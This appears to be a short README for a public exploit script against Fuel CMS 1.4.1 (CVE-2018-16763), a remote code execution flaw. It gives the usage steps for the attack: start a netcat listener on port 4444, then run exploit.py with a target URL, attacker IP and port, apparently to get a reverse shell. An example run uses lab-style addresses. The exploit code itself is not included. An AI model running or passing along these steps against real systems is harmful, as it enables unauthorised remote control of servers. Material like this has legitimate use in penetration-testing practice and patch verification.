# Fuel-CMS-1.4.1 RCE   CVE-2018-16763
Fuel-CMS-1.4.1 using NC

Start a listener on a port of your choice. 

Example:

```
nc -lvnp 4444
```

Usage example:

```
python3 exploit.py <target-url> <attacker-ip> <attacker-port>
python3 exploit.py http://10.10.84.101 10.10.100.213 4444
```

![Screenshot 2025-04-02 160510](https://github.com/user-attachments/assets/9a1e9556-1b7e-4447-9348-9bd47882bd19)
